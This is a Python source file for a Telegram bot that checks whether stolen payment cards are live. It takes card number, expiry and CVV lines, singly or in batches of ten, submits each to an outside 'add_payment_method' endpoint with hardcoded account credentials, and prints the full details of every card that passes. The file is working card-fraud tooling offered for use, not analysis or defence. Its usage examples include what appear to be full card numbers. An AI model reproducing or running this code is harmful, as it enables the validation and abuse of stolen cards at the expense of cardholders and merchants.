import os
import re
import requests
import urllib.parse
import time
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from typing import List, Dict, Any

# Configuration
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
BASE_API_URL = "https://andul-1.onrender.com/add_payment_method"
EMAIL = "sogaged371@hudisk.com"
PASSWORD = "sogaged371@"

# Bank database
BANK_DATABASE = {
    "4": {"brand": "VISA", "country": "USA"},
    "5": {"brand": "MASTERCARD", "country": "USA"},
    "34": {"brand": "AMEX", "country": "USA"},
    "37": {"brand": "AMEX", "country": "USA"},
    "6": {"brand": "DISCOVER", "country": "USA"},
}

def parse_card_line(line: str) -> Dict[str, Any]:
    """Parse card line."""
    match = re.match(r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$', line.strip())
    if not match:
        return None
    
    card_number = match.group(1)
    month = match.group(2).zfill(2)
    year_input = match.group(3)
    cvv = match.group(4)
    
    year_api = year_input[-2:] if len(year_input) == 4 else year_input
    year_full = "20" + year_api if len(year_api) == 2 else year_input
    
    return {
        "card_number": card_number,
        "month": month,
        "year": year_api,
        "year_full": year_full,
        "cvv": cvv,
        "bin": card_number[:6],
        "last4": card_number[-4:],
        "line": line.strip()
    }

def check_card_accurately(card_info: Dict[str, Any]) -> Dict[str, Any]:
    """Check card with PROPER status detection."""
    try:
        card_string = f"{card_info['card_number']}|{card_info['month']}|{card_info['year']}|{card_info['cvv']}"
        encoded_card = urllib.parse.quote(card_string, safe='')
        api_url = f"{BASE_API_URL}/{EMAIL}/{PASSWORD}/{encoded_card}"
        
        print(f"\n{'='*60}")
        print(f"Checking: {card_info['bin']}...{card_info['last4']}")
        print(f"API URL: {api_url}")
        
        # Make request
        response = requests.get(api_url, timeout=30)
        print(f"Status Code: {response.status_code}")
        print(f"Raw Response: {response.text}")
        
        # Get accurate status
        status, message = get_exact_status(response.text)
        is_live = is_card_live(response.text)
        
        # Get brand
        bin_num = card_info['bin']
        brand_info = BANK_DATABASE.get(bin_num[0], {"brand": "UNKNOWN", "country": "UNKNOWN"})
        
        result = {
            "card": f"{card_info['bin']}...{card_info['last4']}",
            "full_card": card_info['card_number'],
            "exp": f"{card_info['month']}/{card_info['year_full']}",
            "cvv": card_info['cvv'],
            "status": status,
            "message": message,
            "brand": brand_info["brand"],
            "country": brand_info["country"],
            "is_live": is_live,
            "raw": card_info['line'],
            "response": response.text
        }
        
        print(f"Result: {status} | Live: {is_live} | Message: {message}")
        print('='*60)
        
        return result
        
    except requests.exceptions.Timeout:
        print("❌ Timeout after 30 seconds")
        return {
            "card": f"{card_info['bin']}...{card_info['last4']}",
            "full_card": card_info['card_number'],
            "exp": f"{card_info['month']}/{card_info['year_full']}",
            "cvv": card_info['cvv'],
            "status": "❌ TIMEOUT",
            "message": "30s timeout - server busy",
            "brand": "UNKNOWN",
            "country": "UNKNOWN",
            "is_live": False,
            "raw": card_info['line'],
            "response": "Timeout"
        }
    except Exception as e:
        print(f"❌ Error: {str(e)}")
        return {
            "card": f"{card_info['bin']}...{card_info['last4']}",
            "full_card": card_info['card_number'],
            "exp": f"{card_info['month']}/{card_info['year_full']}",
            "cvv": card_info['cvv'],
            "status": "❌ ERROR",
            "message": str(e)[:50],
            "brand": "UNKNOWN",
            "country": "UNKNOWN",
            "is_live": False,
            "raw": card_info['line'],
            "response": "Error"
        }

def get_exact_status(response_text: str) -> tuple:
    """Get EXACT status from API response."""
    if not response_text:
        return "❌ NO RESPONSE", "Empty response"
    
    # Debug: Show what we're checking
    print(f"Checking response: {response_text[:200]}")
    
    # Convert to lowercase for checking
    text = response_text.lower().strip()
    
    # Check for LIVE cards (SUCCESS)
    if any(word in text for word in [
        "payment method added",
        "payment added",
        "added successfully",
        "successfully added",
        "approved",
        "success",
        "valid",
        "payment successful",
        "method added"
    ]):
        return "✅ LIVE", "Payment successful"
    
    # Check for SPECIFIC errors from your API
    if "your card number is incorrect" in text:
        return "❌ INCORRECT", "Card number incorrect"
    
    if "your card was declined" in text:
        return "❌ DECLINED", "Card declined"
    
    if "card declined" in text:
        return "❌ DECLINED", "Card declined"
    
    if "insufficient funds" in text:
        return "❌ NO FUNDS", "Insufficient funds"
    
    if "expired card" in text:
        return "❌ EXPIRED", "Card expired"
    
    if "incorrect cvc" in text or "wrong cvc" in text:
        return "❌ WRONG CVC", "Incorrect CVC"
    
    if "stripe pm creation failed" in text:
        return "❌ STRIPE FAILED", "Stripe payment failed"
    
    # Check for JSON error response
    if '"error":' in text:
        # Try to extract error message
        error_match = re.search(r'"error":"([^"]+)"', text)
        if error_match:
            error_msg = error_match.group(1)
            return f"❌ {error_msg[:20]}", error_msg
    
    # If response is short and contains success indicators
    if len(text) < 100:
        if "200" in text or "ok" in text:
            return "✅ LIVE", "Success"
    
    # Default to checking status code or content
    if "decline" in text or "fail" in text or "invalid" in text:
        return "❌ DECLINED", "Payment failed"
    
    return "⚠️ UNKNOWN", f"Response: {text[:50]}"

def is_card_live(response_text: str) -> bool:
    """Determine if card is LIVE based on response."""
    status, _ = get_exact_status(response_text)
    return "✅" in status

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command."""
    await update.message.reply_text(
        "🎯 *ACCURATE CARD CHECKER*\n\n"
        "*Checks cards ONE BY ONE for accuracy*\n\n"
        "*Single Check:*\n"
        "`/chk 5328544152353125|12|28|923`\n\n"
        "*Mass Check (1-10 cards):*\n"
        "`/mass` then send cards\n\n"
        "*Format:*\n"
        "`CARD|MM|YY|CVV`\n\n"
        "*Note:* Shows exact API response",
        parse_mode='Markdown'
    )

async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle single card check."""
    if not context.args:
        await update.message.reply_text("❌ Use: `/chk CARD|MM|YY|CVV`", parse_mode='Markdown')
        return
    
    user_input = " ".join(context.args)
    card_info = parse_card_line(user_input)
    
    if not card_info:
        await update.message.reply_text("❌ Wrong format!")
        return
    
    msg = await update.message.reply_text(f"🔍 Checking `{card_info['bin']}...{card_info['last4']}`...")
    
    # Check card
    result = check_card_accurately(card_info)
    
    # Format response
    response = f"💳 *CARD:* `{result['card']}`\n"
    response += f"📅 *EXP:* {result['exp']} | *CVV:* {result['cvv']}\n"
    response += f"🏷️ *BRAND:* {result['brand']}\n"
    response += "─" * 35 + "\n"
    response += f"*STATUS:* {result['status']}\n"
    response += f"*MESSAGE:* {result['message']}\n"
    
    # Show API response for debugging
    if len(result['response']) < 200:
        response += f"*API RESPONSE:* `{result['response']}`\n"
    
    if result['is_live']:
        response += "─" * 35 + "\n"
        response += "🎯 *LIVE CARD CONFIRMED!*\n"
        response += f"`{result['full_card']}|{result['exp'].replace('/', '|')}|{result['cvv']}`\n"
    
    await msg.edit_text(response, parse_mode='Markdown')

async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start mass checking."""
    context.user_data['mass_cards'] = []
    context.user_data['mass_mode'] = True
    
    await update.message.reply_text(
        "📦 *ACCURATE MASS CHECK*\n\n"
        "*Checks cards SEQUENTIALLY*\n"
        "• Max 10 cards\n"
        "• 30 seconds per card\n"
        "• Shows exact API responses\n\n"
        "Send cards (1-10), one per line:\n"
        "Example:\n"
        "`4116670005727071|02|2026|426`\n"
        "`5275150332990746|01|2030|193`\n\n"
        "Then send `/done`",
        parse_mode='Markdown'
    )

async def done_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process mass cards."""
    if 'mass_cards' not in context.user_data or not context.user_data['mass_cards']:
        await update.message.reply_text("❌ No cards!")
        context.user_data['mass_mode'] = False
        return
    
    cards = context.user_data['mass_cards']
    
    if len(cards) > 10:
        await update.message.reply_text(f"❌ Max 10 cards! You sent {len(cards)}")
        context.user_data['mass_mode'] = False
        return
    
    await process_mass_sequential(update, cards)

async def process_mass_sequential(update: Update, cards: List[Dict[str, Any]]):
    """Process cards one by one (sequential)."""
    total = len(cards)
    
    # Show starting message
    msg = await update.message.reply_text(
        f"🔄 *SEQUENTIAL CHECK STARTED*\n"
        f"📊 Cards: {total}\n"
        f"⏱️ Estimated time: {total * 30} seconds\n"
        f"Checking 1/{total}...",
        parse_mode='Markdown'
    )
    
    results = []
    start_time = time.time()
    
    for i, card_info in enumerate(cards, 1):
        # Update progress
        await msg.edit_text(
            f"🔄 *CHECKING {i}/{total}*\n"
            f"Card: `{card_info['bin']}...{card_info['last4']}`\n"
            f"Time elapsed: {int(time.time() - start_time)}s",
            parse_mode='Markdown'
        )
        
        # Check card
        result = check_card_accurately(card_info)
        results.append(result)
        
        # Small delay between cards
        if i < len(cards):
            time.sleep(5)
    
    total_time = time.time() - start_time
    
    # Analyze results
    live_cards = [r for r in results if r['is_live']]
    dead_cards = [r for r in results if not r['is_live']]
    
    # Build summary
    summary = f"📊 *CHECK COMPLETE*\n"
    summary += "─" * 35 + "\n"
    summary += f"✅ *LIVE CARDS:* {len(live_cards)}\n"
    summary += f"❌ *DEAD CARDS:* {len(dead_cards)}\n"
    summary += f"📁 *TOTAL CHECKED:* {total}\n"
    summary += f"⏱️ *TIME TAKEN:* {total_time:.1f} seconds\n"
    summary += "─" * 35 + "\n\n"
    
    # Show LIVE cards
    if live_cards:
        summary += "🎯 *LIVE CARDS FOUND:*\n\n"
        for i, card in enumerate(live_cards, 1):
            summary += f"{i}. `{card['full_card']}|{card['exp'].replace('/', '|')}|{card['cvv']}`\n"
            summary += f"   {card['brand']} | {card['exp']} | {card['cvv']}\n"
            summary += f"   Status: {card['status']} - {card['message']}\n\n"
    
    # Show dead cards with details
    if dead_cards:
        summary += f"❌ *DEAD CARDS:* {len(dead_cards)}\n"
        
        # Group by status with counts
        status_groups = {}
        for card in dead_cards:
            status = card['status']
            if status not in status_groups:
                status_groups[status] = []
            status_groups[status].append(card)
        
        for status, cards_list in status_groups.items():
            summary += f"\n{status}: {len(cards_list)} cards\n"
            for card in cards_list[:3]:  # Show first 3 of each type
                summary += f"   • {card['card']} - {card['message']}\n"
            if len(cards_list) > 3:
                summary += f"   ... and {len(cards_list) - 3} more\n"
    
    # Send results
    await msg.edit_text(summary, parse_mode='Markdown')
    
    # Clean up
    context.user_data['mass_mode'] = False
    if 'mass_cards' in context.user_data:
        del context.user_data['mass_cards']

async def handle_mass_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle mass card input."""
    if not context.user_data.get('mass_mode', False):
        return
    
    text = update.message.text.strip()
    lines = text.split('\n')
    
    valid_cards = []
    
    for line in lines:
        card = parse_card_line(line)
        if card:
            valid_cards.append(card)
    
    if 'mass_cards' not in context.user_data:
        context.user_data['mass_cards'] = []
    
    context.user_data['mass_cards'].extend(valid_cards)
    total = len(context.user_data['mass_cards'])
    
    await update.message.reply_text(f"✅ Added {len(valid_cards)} cards | Total: {total}/10")

async def handle_direct_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle direct card input."""
    if context.user_data.get('mass_mode', False):
        await handle_mass_input(update, context)
        return
    
    text = update.message.text.strip()
    if re.match(r'^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$', text):
        await chk_command(update, ContextTypes.DEFAULT_TYPE)

async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel mass check."""
    if 'mass_mode' in context.user_data:
        context.user_data['mass_mode'] = False
        if 'mass_cards' in context.user_data:
            del context.user_data['mass_cards']
        await update.message.reply_text("❌ Cancelled")

async def debug_response(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Debug API response for a card."""
    if not context.args:
        await update.message.reply_text("Send: `/debug CARD|MM|YY|CVV`")
        return
    
    card_input = " ".join(context.args)
    card_info = parse_card_line(card_input)
    
    if not card_info:
        await update.message.reply_text("❌ Invalid format")
        return
    
    msg = await update.message.reply_text("🔧 Debugging...")
    
    # Make API call
    card_string = f"{card_info['card_number']}|{card_info['month']}|{card_info['year']}|{card_info['cvv']}"
    encoded_card = urllib.parse.quote(card_string, safe='')
    api_url = f"{BASE_API_URL}/{EMAIL}/{PASSWORD}/{encoded_card}"
    
    try:
        response = requests.get(api_url, timeout=30)
        
        debug_text = f"🔧 *DEBUG FOR:* `{card_info['bin']}...{card_info['last4']}`\n"
        debug_text += "─" * 40 + "\n"
        debug_text += f"*API URL:* `{api_url[:80]}...`\n"
        debug_text += f"*Status Code:* {response.status_code}\n"
        debug_text += f"*Raw Response:*\n```\n{response.text}\n```\n"
        debug_text += "─" * 40 + "\n"
        
        # Analyze response
        status, message = get_exact_status(response.text)
        is_live = is_card_live(response.text)
        
        debug_text += f"*Detected Status:* {status}\n"
        debug_text += f"*Message:* {message}\n"
        debug_text += f"*Is Live?:* {is_live}\n"
        
        await msg.edit_text(debug_text, parse_mode='Markdown')
        
    except Exception as e:
        await msg.edit_text(f"❌ Debug Error: {str(e)}")

def main():
    """Start the bot."""
    if TELEGRAM_BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ Set TELEGRAM_BOT_TOKEN environment variable")
        return
    
    app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    # Commands
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("chk", chk_command))
    app.add_handler(CommandHandler("check", chk_command))
    app.add_handler(CommandHandler("mass", mass_command))
    app.add_handler(CommandHandler("done", done_command))
    app.add_handler(CommandHandler("cancel", cancel_command))
    app.add_handler(CommandHandler("debug", debug_response))
    
    # Handlers
    app.add_handler(MessageHandler(filters.TEXT & filters.Regex(r'^\.chk\s+'), chk_command))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_direct_card))
    
    print("🎯 ACCURATE CARD CHECKER BOT")
    print("=" * 60)
    print("Features:")
    print("  • Checks cards ONE BY ONE")
    print("  • Shows exact API responses")
    print("  • Accurate status detection")
    print("  • Debug command for testing")
    print("\nCommands:")
    print("  /chk <card> - Single check")
    print("  /mass - Mass check (1-10 cards)")
    print("  /debug <card> - See raw API response")
    print("=" * 60)
    
    app.run_polling()

if __name__ == '__main__':
    main()
